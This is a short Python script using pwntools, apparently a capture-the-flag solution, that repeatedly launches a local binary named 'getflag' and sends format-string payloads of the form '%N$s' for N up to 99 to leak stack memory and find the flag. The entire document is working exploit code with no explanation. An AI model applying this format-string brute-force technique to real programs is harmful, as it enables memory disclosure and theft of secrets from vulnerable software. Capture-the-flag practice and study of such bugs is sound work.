from pwn import *

for x in range(100):
    try:
        p = process('./getflag', level='error')
        p.sendlineafter(b'Put the flag: ', '%{}$s'.format(x).encode())
        result = p.recvuntil(b'Put the flag: ')
        print(f'[+] {x} -> {result}')
        p.close()
    except:
        pass